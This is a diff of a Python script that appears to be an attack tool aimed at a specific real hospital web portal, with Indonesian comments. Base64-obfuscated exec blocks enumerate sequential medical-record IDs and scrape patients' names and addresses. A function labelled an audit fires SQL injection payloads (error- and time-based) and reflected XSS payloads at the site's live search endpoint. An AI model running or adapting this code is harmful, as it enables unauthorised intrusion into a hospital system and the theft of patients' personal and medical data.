@@ -84,7 +84,7 @@ def login():
 
 def fetch_data(id_num):
     global total_checked
-    formatted_id = str(id_num).zfill(12)
+    formatted_id = str(id_num).zfill(8)
     url = BASE_TARGET_URL + formatted_id
     
     try:
@@ -100,7 +100,7 @@ def fetch_data(id_num):
         if res.status_code != 200: return
 
         # Protected extraction and masking logic
-        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLi57bmFtYVstMTpdLnVwcGVyKCl9JyBpZiBsZW4obmFtYSkgPiAzIGVsc2UgbmFtYS51cHBlcigpCiAgICBpID0gZm9ybWF0dGVkX2lkCiAgICBtID0gbGVuKGkpLy8yCiAgICBtX3JtID0gZid7aVs6Ml19eycqIyoobS0yKX17aVttXX17JyoiKihsZW4oaSktbS0yKX17aVstMV19JwogICAgcHJpbnQoZidcbltcMDMzWzkybStcMDMzWzBtXSBEYXRhIGRpdGVtdWthbiBSTTp7bV9ybX0gLSB7bWFza30nKQ=="))
+        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBhZGRyID0gIlRpZGFrIERpdGVtdWthbiIKICAgIGRldGFpbHMgPSBzb3VwLmZpbmRfYWxsKCdwJywgY2xhc3NfPSdkZXRhaWwnKQogICAgZm9yIHAgaW4gZGV0YWlsczoKICAgICAgICBpZiAiQWxhbWF0IiBpbiBwLmdldF90ZXh0KCk6IGFkZHIgPSBwLmdldF90ZXh0KCkuc3BsaXQoIjoiKVstMV0uc3RyaXAoKTsgYnJlYWsKICAgIG1fbmFtYSA9IGYie25hbWFbOjJdLnVwcGVyKCl9Kip7bmFtYVstMTpdLnVwcGVyKCl9IiBpZiBsZW4obmFtYSkgPiAzIGVsc2UgbmFtYS51cHBlcigpCiAgICBtX2FkZHIgPSBmInthZGRyWzoyXS51cHBlcigpfSooe2FkZHJbLTE6XS51cHBlcigpfSIgaWYgbGVuKGFkZHIpID4gMyBlbHNlIGFkZHIudXBwZXIoKQogICAgaSA9IGZvcm1hdHRlZF9pZAogICAgbSA9IGxlbihpKS8vMgogICAgbV9ybSA9IGYie2lbOjJdfXsnKicqKG0tMil9e2lb bV19eycqIyoobGVuKGkpLW0tMil9e2lbLTE6XX0iCiAgICBwcmludChmIlxuW1wwMzNbOTJtK1wwMzNbMG1dIFJNOnttX3JtfSB8IE5hbWE6e21fbmFtYX0gfCBBbGFtYXQ6e21fYWRkcn0iKQ=="))
 
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
@@ -209,7 +209,7 @@ def parameter_discovery_audit():
                     def check_id_vulnerability(val):
                         nonlocal checked_count
                         if found_event.is_set(): return
-                        test_id = str(val).zfill(int(_decode("MTI=")))
+                        test_id = str(val).zfill(8)
                         test_url = base_url.replace(original_id, test_id)
                         try:
                             # Gunakan timeout lebih pendek (5s) untuk discovery agar tidak macet
@@ -268,50 +268,57 @@ def parameter_discovery_audit():
 def vulnerability_audit():
     # [*] Initiating Automated Vulnerability Scan...
     print(f"\n{_decode('WypdIEluaXRpYXRpbmcgQXV0b21hdGVkIFZ1bG5lcmFiaWxpdHkgU2Nhbi4uLg==')}")
-    
+
     # Automatisasi menggunakan NO_RM internal sebagai base target
     target_id = NO_RM
     base_url = BASE_TARGET_URL + target_id
-    
-    # --- 1. SQL Injection Testing (Expanded Payloads) ---
-    # [+] Audit: SQL Injection Error-Based
-    print(f"\n{_decode('WysrXSBBdWRpdDogU1FMIEluamVjdGlvbiBFcnJvci1CYXNlZA==')}")
-    sqli_payloads = ["'", "''", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' OR 1=1--", "' OR '1'='1'#", "') OR ('1'='1", "admin'--"]
+
+    # --- 1. SQL Injection Testing ---
+    # [+] Audit: SQL Injection (time & error based)
+    print(f"\n{_decode('WysrXSBBdWRpdDogU1FMIEluamVjdGlvbiAodGltZSAmIGVycm9yIGJhc2VkKQ==')}")
+    sqli_payloads = [
+        ("'", "Error-based"), ("1' OR '1'='1", "Pattern Bypass"), 
+        ("' OR 1=1--", "Comment Bypass"), ("'; WAITFOR DELAY '0:0:5'--", "Time-based (MSSQL)"),
+        ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "Time-based (MySQL)")
+    ]
     sql_errors = ["SQL syntax", "mysql_fetch", "nativeclient", "Database Error", "ORA-01756", "SQLite3::query"]
-    
-    for payload in sqli_payloads:
+
+    for payload, method in sqli_payloads:
         test_url = base_url + payload
         try:
+            start_t = time.time()
             res = session.get(test_url, timeout=int(_decode('MTA=')))
-            if any(error.lower() in res.text.lower() for error in sql_errors):
-                print(f" [\033[91m!\033[0m] {_decode('U1FMaSBWdWxuZXJhYmlsaXR5IEZvdW5kIQ==')}")
-                print(f"     {_decode('VGFyZ2V0IFVSTA==')} : {test_url}")
-                print(f"     {_decode('UGF5bG9hZA==')}     : {payload}")
-                print(f"     {_decode('TWV0aG9k')}      : {_decode('RXJyb3ItQmFzZWQgSW5qZWN0aW9u')}")
-                break
-        except: pass
-    else:
-        print(f" [\033[92m✓\033[0m] {_decode('U1FMaTogTm8gb2J2aW91cyBlcnJvciBwYXR0ZXJucyBkZXRlY3RlZC4=')}")
+            elapsed = time.time() - start_t
 
-    # --- 2. Reflected XSS Testing (Expanded Payloads) ---
+            if ("SLEEP" in payload or "WAITFOR" in payload) and elapsed >= 5:
+                print(f" [\033[91m!\033[0m] SQLi Potential (Time-based) Detected!")
+                print(f"     URL     : {test_url}")
+                print(f"     Method  : {method}")
+                continue
+
+            if any(error.lower() in res.text.lower() for error in sql_errors):
+                print(f" [\033[91m!\033[0m] SQLi Potential (Error-based) Detected!")
+                print(f"     URL     : {test_url}")
+                print(f"     Payload : {payload}")
+                continue
+        except: pass
+
+    # --- 2. Reflected XSS Testing ---
     # [+] Audit: Reflected Cross-Site Scripting
     print(f"\n{_decode('WysrXSBBdWRpdDogUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5n')}")
-    xss_payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)", "'-alert(1)-'"]
+    xss_payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "<svg/onload=alert(1)>"]
     search_endpoint = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jpd2F5YXRfcGVtZXJpa3NhYW4/c2VhcmNoPQ==")
-    
+
     for payload in xss_payloads:
         test_url = search_endpoint + payload
         try:
             res = session.get(test_url, timeout=int(_decode('MTA=')))
             if payload in res.text:
-                print(f" [\033[91m!\033[0m] {_decode('WFNTIFZ1bG5lcmFiaWxpdHkgRm91bmQh')}")
-                print(f"     {_decode('VGFyZ2V0IFVSTA==')} : {test_url[:80]}...")
-                print(f"     {_decode('UGF5bG9hZA==')}     : {payload}")
-                print(f"     {_decode('TWV0aG9k')}      : {_decode('UmVmbGVjdGVkIFhTUyBJbmplY3Rpb24=')}")
-                break
+                print(f" [\033[91m!\033[0m] XSS Potential Detected!")
+                print(f"     URL     : {test_url[:80]}...")
+                print(f"     Payload : {payload}")
+                continue
         except: pass
-    else:
-        print(f" [\033[92m✓\033[0m] {_decode('WFNTOiBJbnB1dCBwcm9wZXJseSBzYW5pdGl6ZWQgb3IgZW5jb2RlZC4=')}")
 
     # --- 3. Stored XSS Surface Analysis ---
     # [+] Audit: Stored XSS Attack Surface Mapping
